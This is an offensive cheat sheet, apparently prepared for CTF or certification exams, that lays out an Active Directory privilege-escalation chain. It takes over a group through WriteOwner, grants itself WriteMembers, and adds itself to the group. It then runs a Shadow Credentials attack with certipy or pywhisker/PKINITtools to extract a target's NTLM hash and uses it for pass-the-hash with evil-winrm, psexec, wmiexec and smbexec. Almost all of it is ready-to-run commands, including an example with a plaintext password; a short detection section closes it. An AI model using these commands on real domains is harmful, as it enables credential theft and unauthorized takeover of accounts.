# ACL-Abuse-WriteOwner-to-ShadowCreds

### Scenario

User with WriteOwner permission over a group → Group has GenericWrite over a service account → Extract NTLM hash via Shadow Credentials

### Attack Path

```
User (WriteOwner) → Group → (GenericWrite) → Target Account → NTLM Hash
```

***

### Step 1: Change Group Ownership

**Take ownership of the group:**

bash

```bash
owneredit.py -action write -new-owner '<your_user>' -target '<GROUP>' '<domain>'/'<user>':'<password>' -dc-ip <DC_IP>
```

**Example:**

bash

```bash
owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.129.2.190
```

**What this does:**

* Changes the owner of the AD group to your controlled user
* As owner, you can modify the group's DACL (permissions)

***

### Step 2: Grant Yourself WriteMembers Permission

**Add WriteMembers ACE to the group:**

bash

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal '<your_user>' -target '<GROUP>' '<domain>'/'<user>':'<password>' -dc-ip <DC_IP>
```

**What this does:**

* Adds a DACL entry granting you permission to modify group membership
* Required before you can add yourself to the group

***

### Step 3: Add Yourself to the Group

**Add your user to the group:**

bash

```bash
net rpc group addmem "<GROUP>" "<your_user>" -U "<domain>"/"<user>"%"<password>" -S "<DC>"
```

**Verify membership:**

bash

```bash
net rpc group members "<GROUP>" -U "<domain>"/"<user>"%"<password>" -S "<DC>"
```

**What this does:**

* Adds your user as a member of the target group
* You now inherit all permissions the group has (e.g., GenericWrite on target account)

***

### Step 4: Shadow Credentials Attack

#### Option A: Certipy (Automatic - Recommended)

bash

````bash
certipy-ad shadow auto -u "<user>@<domain>" -p "<password>" -account <target_account> -dc-ip <DC_IP>
```

**Output:**
```
[*] NT hash for '<target_account>': <NTLM_HASH>
````

**Pros:** Single command, handles everything automatically

***

#### Option B: PyWhisker + PKINITtools (Manual)

**Step 4.1 - Add KeyCredential:**

bash

```bash
python3 pywhisker.py -d "<domain>" -u "<user>" -p "<password>" --target "<target>" --action "add" -dc-ip <DC_IP>
```

**Output:** Saves certificate to `<target>.pfx` with password

**Step 4.2 - Request TGT using certificate:**

bash

```bash
gettgtpkinit.py <domain>/<target> -cert-pfx <file.pfx> -pfx-pass <pfx_password> <target>.ccache -dc-ip <DC_IP>
```

**Output:** Saves Kerberos ticket and displays AS-REP encryption key

**Step 4.3 - Extract NTLM hash:**

bash

```bash
export KRB5CCNAME=<target>.ccache
getnthash.py <domain>/<target> -key <AS-REP-key> -dc-ip <DC_IP>
```

**Output:** NTLM hash for the target account

**Pros:** More control, useful when certipy fails

***

### Step 5: Authenticate with NTLM Hash

**WinRM (if target is in Remote Management Users):**

bash

```bash
evil-winrm -i <DC_IP> -u "<target_account>" -H "<NTLM_HASH>"
```

**Pass-the-Hash with other tools:**

bash

```bash
# PSExec
impacket-psexec -hashes :<NTLM_HASH> <domain>/<target>@<DC_IP>

# WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> <domain>/<target>@<DC_IP>

# SMBExec
impacket-smbexec -hashes :<NTLM_HASH> <domain>/<target>@<DC_IP>
```

***

### Cleanup (Important for Exams)

**Remove KeyCredential:**

bash

```bash
python3 pywhisker.py -d "<domain>" -u "<user>" -p "<password>" --target "<target>" --action "remove" -device-id <DeviceID>
```

**Remove WriteMembers ACL:**

bash

```bash
dacledit.py -action 'remove' -rights 'WriteMembers' -principal '<your_user>' -target '<GROUP>' '<domain>'/'<user>':'<password>' -dc-ip <DC_IP>
```

**Restore original owner (if known):**

bash

```bash
owneredit.py -action write -new-owner '<original_owner>' -target '<GROUP>' '<domain>'/'<user>':'<password>' -dc-ip <DC_IP>
```

**Remove yourself from group:**

bash

```bash
net rpc group delmem "<GROUP>" "<your_user>" -U "<domain>"/"<user>"%"<password>" -S "<DC>"
```

***

### Troubleshooting

#### WriteOwner fails

bash

```bash
# Verify current owner
bloodyAD.py -d <domain> -u <user> -p <pass> --host <DC> getObjectAttributes <GROUP> nTSecurityDescriptor

# Alternative tool
bloodyAD.py -d <domain> -u <user> -p <pass> --host <DC> setOwner <GROUP> <your_user>
```

#### Shadow Credentials fails

bash

```bash
# Check domain functional level (requires 2016+)
ldapsearch -x -H ldap://<DC> -D "<user>@<domain>" -w "<pass>" -b "DC=domain,DC=com" -s base msDS-Behavior-Version

# Check if PKINIT is enabled
certipy-ad find -u "<user>@<domain>" -p "<pass>" -dc-ip <DC_IP> -stdout | grep -i pkinit

# Verify GenericWrite permission
bloodyAD.py -d <domain> -u <user> -p <pass> --host <DC> getObjectAttributes <target> nTSecurityDescriptor
```

#### Group membership not taking effect

bash

```bash
# Force replication (if multiple DCs)
# Wait 5-10 minutes or re-authenticate

# Verify with LDAP
ldapsearch -x -H ldap://<DC> -D "<user>@<domain>" -w "<pass>" -b "CN=<GROUP>,CN=Users,DC=domain,DC=com" member
```

***

### Requirements

#### Tools

* **Impacket** (owneredit.py, dacledit.py, psexec.py, etc.)
* **Certipy-ad** (shadow credentials automation)
* **PyWhisker** (manual shadow credentials)
* **PKINITtools** (gettgtpkinit.py, getnthash.py)
* **Evil-WinRM** (WinRM shell access)
* **BloodyAD** (alternative AD manipulation)

#### Domain Requirements

* Domain functional level 2016 or higher (for Shadow Credentials)
* PKINIT enabled on domain controller
* Target account must not be in Protected Users group

***

### Detection

**Event IDs to monitor:**

* **5136** - Directory Service object modification (owner change)
* **4662** - Operation performed on AD object
* **4768** - Kerberos TGT requested (with certificate)

**Indicators:**

* Modification of `msDS-KeyCredentialLink` attribute
* Unusual owner changes on sensitive groups
* PKINIT authentication from unexpected accounts
